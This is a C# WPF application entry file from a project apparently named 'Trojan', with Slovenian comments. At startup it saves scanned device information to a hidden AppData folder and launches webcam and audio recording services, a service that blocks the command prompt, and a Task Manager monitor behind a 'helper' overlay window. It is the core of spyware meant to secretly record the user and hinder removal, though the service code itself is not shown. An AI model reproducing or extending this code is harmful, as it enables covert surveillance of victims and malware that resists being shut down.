using System.Windows;
using Trojan.DataBase;
using Trojan.Views;
using Trojan.Services;
using System.Windows.Input;

namespace Trojan
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {

        private WebcamService _webcamService;
        private AudioRecorderService _audioRecorder;
        private CmdBlockerService _cmdBlockerService;
        private TaskManagerMonitorService _taskManagerMonitorService;
        protected override async void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);
            EventManager.RegisterClassHandler(
            typeof(Window),
            Keyboard.KeyDownEvent,
            new KeyEventHandler(GlobalKeyHandler));

            await DeviceScannerService.SaveDeviceInfo();

            //PODATKE O NAPRAVI SE SHRAANIJO NA "C:\Users\IME\AppData\Roaming\gnezdece\device_info.txt"

            // Ob zagonu aplikacije zagotovimo, da je podatkovna baza ustvarjena
            using (var db = new AppDbContext())
            {
                db.Database.EnsureCreated();
            }

            _webcamService = new WebcamService();
            _webcamService.Start();


            _audioRecorder = new AudioRecorderService();
            _audioRecorder.Start();

            _cmdBlockerService = new CmdBlockerService();
            _cmdBlockerService.Start();

            _taskManagerMonitorService = new TaskManagerMonitorService();
            _taskManagerMonitorService.Start();

            var helperOverlayWindow = new HelperOverlayWindow();
            MainWindow = helperOverlayWindow;
            helperOverlayWindow.Show();

            
        }

        protected override void OnExit(ExitEventArgs e)
        {
            _webcamService?.Stop();
            _audioRecorder?.Stop();
            _cmdBlockerService?.Stop();
            _taskManagerMonitorService?.Stop();
            base.OnExit(e);
        }
        private void GlobalKeyHandler(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Escape)
            {
                Current.Shutdown();
            }
        }
    }
}
